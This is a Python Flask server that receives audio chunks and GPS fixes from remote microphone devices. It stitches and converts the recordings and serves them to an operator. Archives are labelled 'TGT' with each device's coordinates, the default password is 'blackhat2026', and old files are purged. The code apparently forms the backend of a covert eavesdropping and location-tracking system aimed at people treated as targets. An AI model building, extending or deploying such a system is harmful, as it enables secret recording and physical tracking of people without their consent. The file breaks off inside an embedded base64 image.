import os
import re as _re
import time
import threading
import zipfile
import json
import shutil
import hashlib
import subprocess as _sp
from flask import Flask, request, send_file, jsonify, abort

try:
    import imageio_ffmpeg
    FFMPEG = imageio_ffmpeg.get_ffmpeg_exe()
except Exception:
    FFMPEG = None
if not FFMPEG:
    # fallback: a system ffmpeg on PATH works just as well
    try:
        _sp.run(["ffmpeg", "-version"], stdout=_sp.DEVNULL,
                stderr=_sp.DEVNULL, timeout=10)
        FFMPEG = "ffmpeg"
    except Exception:
        FFMPEG = None

app = Flask(__name__)

# Storage: on Render attach a persistent disk and set DATA_DIR=/var/data/madasha
# (see render.yaml). If the disk is missing or not writable, fall back to
# /tmp/madasha automatically so the service ALWAYS starts.
DIR = os.environ.get("DATA_DIR", "/tmp/madasha")
try:
    os.makedirs(DIR, exist_ok=True)
    _probe = os.path.join(DIR, ".w")
    with open(_probe, "w") as _fh:
        _fh.write("x")
    os.remove(_probe)
except OSError:
    DIR = "/tmp/madasha"
    os.makedirs(DIR, exist_ok=True)
MIC_KEY = os.environ.get("MIC_KEY", "mic-change-me")
LISTEN_KEY = os.environ.get("LISTEN_KEY", "listen-change-me")
KEEP = int(os.environ.get("KEEP_HOURS", "12")) * 3600  # keep last N hours
ADMIN_USER = os.environ.get("ADMIN_USER", "admin")
ADMIN_PASS = os.environ.get("ADMIN_PASS", "blackhat2026")

index = {"chunks": []}
devices = {}
state = {"last": 0}
geo = {"lat": None, "lon": None, "acc": None, "ts": 0}
lock = threading.Lock()

STATE_FILE = os.path.join(DIR, "state.json")


def save_state():
    with lock:
        data = {"index": index, "devices": devices,
                "state": state, "geo": geo}
    tmp = STATE_FILE + ".tmp"
    try:
        with open(tmp, "w") as f:
            json.dump(data, f)
        os.replace(tmp, STATE_FILE)
    except Exception:
        pass


def load_state():
    if not os.path.exists(STATE_FILE):
        return
    try:
        with open(STATE_FILE) as f:
            data = json.load(f)
    except Exception:
        return
    with lock:
        index["chunks"] = data.get("index", {}).get("chunks", [])
        devices.clear()
        for did, v in data.get("devices", {}).items():
            dv = {"chunks": v.get("chunks", []), "last": v.get("last", 0),
                  "geo": v.get("geo"), "seen": v.get("seen", 0)}
            if "no" in v:
                dv["no"] = v["no"]
            devices[did] = dv
        state.update(data.get("state", {}))
        geo.update(data.get("geo", {}))
        used_nos.clear()
        for v in devices.values():
            if "no" in v:
                try:
                    used_nos.add(int(v["no"]))
                except (TypeError, ValueError):
                    pass


def clean_dev(d):
    d = _re.sub(r"[^a-zA-Z0-9\-]", "", d or "")[:24]
    return d or "room"


def auth_token():
    raw = "%s:%s:%s" % (ADMIN_USER, ADMIN_PASS, MIC_KEY)
    return hashlib.sha256(raw.encode()).hexdigest()[:32]


def authed():
    if request.args.get("key") == MIC_KEY:
        return True
    return request.cookies.get("mdauth") == auth_token()


@app.route("/")
def home():
    return "madasha ok"


@app.route("/healthz")
def healthz():
    return "ok"


import random as _random

used_nos = set()

load_state()


@app.route("/hello", methods=["POST"])
def hello():
    if request.args.get("key") != MIC_KEY:
        abort(403)
    dev = clean_dev(request.form.get("dev"))
    load_state()
    with lock:
        dv = devices.setdefault(dev, {"chunks": [], "last": 0, "geo": None, "seen": 0})
        dv["seen"] = time.time()
        if "no" not in dv:
            while True:
                n = _random.randint(0, 999)
                if n not in used_nos:
                    used_nos.add(n)
                    break
            dv["no"] = "0%03d" % n
        no = dv["no"]
    save_state()
    return jsonify({"no": no})


@app.route("/up", methods=["POST"])
def up():
    if request.args.get("key") != MIC_KEY:
        abort(403)
    f = request.files.get("audio")
    if not f:
        return "no audio", 400
    dev = clean_dev(request.form.get("dev"))
    load_state()
    ext = request.form.get("ext", "webm")
    if ext not in ("webm", "m4a", "ogg", "mp4"):
        ext = "webm"
    ts = time.time()
    sess = clean_dev(request.form.get("sess"))[:12] or "x"
    try:
        frag = int(request.form.get("frag", request.form.get("seq", "0")))
    except ValueError:
        frag = 0
    name = "%s_s%s_f%06d.%s" % (dev, sess, frag, ext)
    f.save(os.path.join(DIR, name))
    with lock:
        index["chunks"].append({"ts": ts, "name": name, "dev": dev,
                                "sess": sess, "frag": frag})
        dv = devices.setdefault(dev, {"chunks": [], "last": 0, "geo": None, "seen": 0})
        dv["chunks"].append({"ts": ts, "name": name, "sess": sess, "frag": frag})
        dv["last"] = ts
        state["last"] = ts
        cutoff = ts - KEEP
        keep = []
        for c in index["chunks"]:
            if c["ts"] < cutoff:
                try:
                    os.remove(os.path.join(DIR, c["name"]))
                except OSError:
                    pass
            else:
                keep.append(c)
        index["chunks"] = keep[-5000:]
        for did in list(devices.keys()):
            d = devices[did]
            d["chunks"] = [c for c in d["chunks"] if c["ts"] >= cutoff]
            if not d["chunks"] and (ts - max(d.get("last", 0), d.get("seen", 0))) > KEEP:
                del devices[did]
    save_state()
    return "ok"


@app.route("/loc", methods=["POST"])
def loc():
    if request.args.get("key") != MIC_KEY:
        abort(403)
    dev = clean_dev(request.form.get("dev"))
    load_state()
    try:
        g = {"lat": float(request.form.get("lat")),
             "lon": float(request.form.get("lon")),
             "acc": float(request.form.get("acc", 0)),
             "ts": time.time()}
    except (TypeError, ValueError):
        return "bad", 400
    with lock:
        dv = devices.setdefault(dev, {"chunks": [], "last": 0, "geo": None, "seen": 0})
        dv["geo"] = g
        geo.update(g)
    save_state()
    return "ok"


@app.route("/index.json")
def idx():
    k = request.args.get("key")
    if k != LISTEN_KEY and not authed():
        abort(403)
    load_state()
    with lock:
        out = {
            "chunks": index["chunks"],
            "live": (time.time() - state["last"]) < 12,
            "last": state["last"],
        }
        if authed():
            now = time.time()
            out["geo"] = dict(geo)
            dl = []
            for did, v in devices.items():
                dl.append({
                    "id": did,
                    "no": v.get("no"),
                    "last": v.get("last", 0),
                    "seen": v.get("seen", 0),
                    "live": (now - v.get("last", 0)) < 12,
                    "geo": v.get("geo"),
                    "n": len(v["chunks"]),
                    "sig": signal_of(v["chunks"]),
                    "sessions": sessions_of(v["chunks"]),
                })
            dl.sort(key=lambda x: x["last"], reverse=True)
            out["devices"] = dl
    return jsonify(out)


def signal_of(chunks):
    """Estimate mic signal from recent fragment sizes (bytes on disk)."""
    recent = chunks[-6:]
    if not recent:
        return "none"
    tot = 0
    cnt = 0
    for c in recent:
        try:
            tot += os.path.getsize(os.path.join(DIR, c["name"]))
            cnt += 1
        except OSError:
            pass
    if not cnt:
        return "none"
    avg = tot / cnt
    if avg < 4000:
        return "silent"
    if avg < 15000:
        return "weak"
    return "good"


def sessions_of(chunks):
    out = {}
    for c in chunks:
        s = out.setdefault(c.get("sess", "x"),
                           {"sess": c.get("sess", "x"), "n": 0,
                            "first": c["ts"], "last": c["ts"],
                            "ext": c["name"].rsplit(".", 1)[-1]})
        s["n"] += 1
        s["last"] = c["ts"]
    res = sorted(out.values(), key=lambda s: s["first"])
    for s in res:
        s["dur"] = round(s["last"] - s["first"])
    return res


@app.route("/dev/<dev>/index.json")
def dev_idx(dev):
    if not authed():
        abort(403)
    dev = clean_dev(dev)
    load_state()
    with lock:
        dv = devices.get(dev)
        if not dv:
            return jsonify({"chunks": [], "live": False, "last": 0, "sessions": []})
        return jsonify({
            "chunks": dv["chunks"],
            "live": (time.time() - dv.get("last", 0)) < 12,
            "last": dv.get("last", 0),
            "geo": dv.get("geo"),
            "sessions": sessions_of(dv["chunks"]),
        })


@app.route("/stitch/<dev>/<sess>")
def stitch(dev, sess):
    if not authed():
        abort(403)
    dev = clean_dev(dev)
    sess = clean_dev(sess)[:12]
    load_state()
    with lock:
        dv = devices.get(dev)
        chunks = [c for c in (dv["chunks"] if dv else [])
                  if c.get("sess", "x") == sess]
    chunks.sort(key=lambda c: c.get("frag", 0))
    paths = [os.path.join(DIR, c["name"]) for c in chunks
             if os.path.exists(os.path.join(DIR, c["name"]))]
    if not paths:
        return "no recording yet", 404
    ext = paths[0].rsplit(".", 1)[-1]
    if ext != "webm":
        # non-webm chunks cannot be raw-concatenated; serve the converted m4a
        conv = convert_m4a(dev, sess)
        if not conv:
            return "converting, retry", 503
        return send_file(conv, mimetype="audio/mp4")
    cached = os.path.join(DIR, "st_%s_%s_%d.%s" % (dev, sess, len(paths), ext))
    if not os.path.exists(cached):
        tmp = cached + ".tmp"
        try:
            with open(tmp, "wb") as out:
                for p in paths:
                    with open(p, "rb") as fh:
                        shutil.copyfileobj(fh, out)
            os.replace(tmp, cached)
        except OSError:
            try:
                os.remove(tmp)
            except OSError:
                pass
            return "busy", 503
    mime = "audio/webm" if ext == "webm" else "audio/mp4"
    fname = "duubis-%s-%s.%s" % (dev, sess, ext)
    if request.args.get("dl"):
        return send_file(cached, mimetype=mime, as_attachment=True,
                         download_name=fname)
    return send_file(cached, mimetype=mime)


@app.route("/stitchall/<dev>")
def stitchall(dev):
    if not authed():
        abort(403)
    dev = clean_dev(dev)
    load_state()
    with lock:
        dv = devices.get(dev)
        chunks = sorted(list(dv["chunks"]) if dv else [],
                        key=lambda c: c["ts"])
    paths = [os.path.join(DIR, c["name"]) for c in chunks
             if os.path.exists(os.path.join(DIR, c["name"]))]
    if not paths:
        return "no recording yet", 404
    ext = paths[0].rsplit(".", 1)[-1]

    def gen():
        for p in paths:
            try:
                with open(p, "rb") as fh:
                    while True:
                        b = fh.read(65536)
                        if not b:
                            break
                        yield b
            except OSError:
                pass

    mime = "audio/webm" if ext == "webm" else "audio/mp4"
    fname = "duubis-FULL-%s.%s" % (dev, ext)
    return app.response_class(gen(), mimetype=mime,
        headers={"Content-Disposition": "attachment; filename=" + fname})


EBML = b"\x1aE\xdf\xa3"


def convert_m4a(dev, sess):
    """Stitch chunks and convert to a universal .m4a voice file. Cached.
    Handles complete standalone chunks (webm or m4a) via the concat demuxer,
    and legacy timeslice webm fragments via raw byte concat."""
    with lock:
        dv = devices.get(dev)
        chunks = [c for c in (dv["chunks"] if dv else [])
                  if sess is None or c.get("sess", "x") == sess]
    chunks.sort(key=lambda c: (c["ts"], c.get("frag", 0)))
    paths = [os.path.join(DIR, c["name"]) for c in chunks
             if os.path.exists(os.path.join(DIR, c["name"]))]
    if not paths:
        return None
    tag = "%s_%s_%d" % (dev, sess or "all", len(paths))
    cached = os.path.join(DIR, "conv_%s.m4a" % tag)
    if os.path.exists(cached) and os.path.getsize(cached) > 0:
        return cached
    if not FFMPEG:
        return None
    ext = paths[0].rsplit(".", 1)[-1]
    uid = int(time.time() * 1000)
    outm = os.path.join("/tmp", "w%d.m4a" % uid)

    def good():
        return os.path.exists(outm) and os.path.getsize(outm) > 0

    def via_list():
        lst = os.path.join("/tmp", "w%d.txt" % uid)
        try:
            with open(lst, "w") as fh:
                for p in paths:
                    fh.write("file '%s'\n" % p)
            _sp.run([FFMPEG, "-y", "-f", "concat", "-safe", "0", "-i", lst,
                     "-vn", "-c:a", "aac", "-b:a", "128k",
                     "-movflags", "+faststart", outm],
                    timeout=110, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
        except Exception:
            pass
        finally:
            try:
                os.remove(lst)
            except OSError:
                pass
        return good()

    def via_raw():
        tmpw = os.path.join("/tmp", "w%d.webm" % uid)
        try:
            with open(tmpw, "wb") as out:
                for p in paths:
                    with open(p, "rb") as fh:
                        shutil.copyfileobj(fh, out)
            _sp.run([FFMPEG, "-y", "-i", tmpw, "-vn", "-c:a", "aac",
                     "-b:a", "128k", "-movflags", "+faststart", outm],
                    timeout=110, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
        except Exception:
            pass
        finally:
            try:
                os.remove(tmpw)
            except OSError:
                pass
        return good()

    complete = False
    if ext == "webm":
        try:
            complete = all(open(p, "rb").read(4) == EBML for p in paths)
        except OSError:
            complete = False
    ok = via_raw() if (ext == "webm" and not complete) else via_list()
    if not ok:
        ok = via_list() if (ext == "webm" and not complete) else via_raw()
    if ok:
        shutil.move(outm, cached)
        return cached
    try:
        os.remove(outm)
    except OSError:
        pass
    return None


@app.route("/get/<dev>/<sess>.m4a")
def get_m4a(dev, sess):
    if not authed():
        abort(403)
    dev = clean_dev(dev)
    sess = clean_dev(sess)[:12]
    load_state()
    p = convert_m4a(dev, sess)
    if not p:
        return stitch(dev, sess)
    if request.args.get("inline"):
        return send_file(p, mimetype="audio/mp4")
    return send_file(p, mimetype="audio/mp4", as_attachment=True,
                     download_name="duubis-%s-%s.m4a" % (dev, sess))


@app.route("/getall/<dev>.m4a")
def getall_m4a(dev):
    if not authed():
        abort(403)
    dev = clean_dev(dev)
    load_state()
    p = convert_m4a(dev, None)
    if not p:
        return stitchall(dev)
    with lock:
        dv = devices.get(dev) or {}
    tag = "TGT-%s" % dv.get("no") if dv.get("no") else dev
    loctag = ""
    g = dv.get("geo")
    if g and g.get("lat") is not None:
        loctag = "_%.4f_%.4f" % (g["lat"], g["lon"])
    fname = "%s%s_%s.m4a" % (tag, loctag, time.strftime("%Y%m%d-%H%M"))
    return send_file(p, mimetype="audio/mp4", as_attachment=True,
                     download_name=fname)


@app.route("/f/<name>")
def serve_file(name):
    k = request.args.get("key")
    if k != LISTEN_KEY and not authed():
        abort(403)
    if "/" in name or ".." in name:
        abort(400)
    path = os.path.join(DIR, name)
    if not os.path.exists(path):
        abort(404)
    mime = "audio/webm" if name.endswith(".webm") else "audio/mp4"
    return send_file(path, mimetype=mime)


def seg_webm(name):
    """Path of a complete, self-contained webm/opus segment for chairman MSE.
    webm chunks pass through; m4a/mp4/ogg chunks are converted once, cached."""
    src = os.path.join(DIR, name)
    if not os.path.exists(src):
        return None
    if name.endswith(".webm"):
        return src
    if not FFMPEG:
        return None
    cached = os.path.join(DIR, "sg_" + name.rsplit(".", 1)[0] + ".webm")
    if os.path.exists(cached) and os.path.getsize(cached) > 0:
        return cached
    tmp = cached + ".tmp.webm"
    try:
        _sp.run([FFMPEG, "-y", "-i", src, "-vn", "-c:a", "libopus",
                 "-b:a", "64k", "-f", "webm", tmp],
                timeout=60, stdout=_sp.DEVNULL, stderr=_sp.DEVNULL)
        if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
            os.replace(tmp, cached)
            return cached
    except Exception:
        pass
    try:
        os.remove(tmp)
    except OSError:
        pass
    return None


@app.route("/seg/<name>")
def seg(name):
    k = request.args.get("key")
    if k != LISTEN_KEY and not authed():
        abort(403)
    if "/" in name or ".." in name:
        abort(400)
    p = seg_webm(name)
    if not p:
        abort(404)
    return send_file(p, mimetype="audio/webm")


def make_zip(chunks, prefix, meta=None):
    meta = meta or {}
    zpath = os.path.join("/tmp", "%s-%d.zip" % (prefix, int(time.time())))
    groups = {}
    for c in chunks:
        groups.setdefault((c["dev"], c.get("sess", "x")), []).append(c)
    with zipfile.ZipFile(zpath, "w", zipfile.ZIP_DEFLATED) as z:
        for (dev, sess), items in sorted(groups.items(),
                                         key=lambda kv: kv[1][0]["ts"]):
            items.sort(key=lambda c: c.get("frag", 0))
            ext = items[0]["name"].rsplit(".", 1)[-1]
            m = meta.get(dev, {})
            tag = "TGT-%s" % m["no"] if m.get("no") else dev
            g = m.get("geo") or {}
            loctag = ""
            if g.get("lat") is not None:
                loctag = "_%.4f_%.4f" % (g["lat"], g["lon"])
            arc = "%s%s_%s_s%s.%s" % (
                tag, loctag,
                time.strftime("%H-%M-%S", time.localtime(items[0]["ts"])),
                sess, ext)
            with z.open(arc, "w") as zf:
                for c in items:
                    p = os.path.join(DIR, c["name"])
                    if os.path.exists(p):
                        with open(p, "rb") as fh:
                            while True:
                                b = fh.read(65536)
                                if not b:
                                    break
                                zf.write(b)
    return zpath


@app.route("/archive.zip")
def archive():
    if not authed():
        abort(403)
    load_state()
    with lock:
        chunks = list(index["chunks"])
        meta = {did: {"no": v.get("no"), "geo": v.get("geo")}
                for did, v in devices.items()}
    if not chunks:
        return "no recording yet", 404
    return send_file(make_zip(chunks, "kulan", meta), mimetype="application/zip",
                     as_attachment=True,
                     download_name="kulan-%s.zip" % time.strftime("%Y%m%d-%H%M"))


@app.route("/dev/<dev>.zip")
def dev_zip(dev):
    if not authed():
        abort(403)
    dev = clean_dev(dev)
    load_state()
    with lock:
        dv = devices.get(dev)
        chunks = list(dv["chunks"]) if dv else []
    if not chunks:
        return "no recording yet", 404
    return send_file(make_zip(chunks, dev), mimetype="application/zip",
                     as_attachment=True,
                     download_name="duubista-%s.zip" % dev)


EM = "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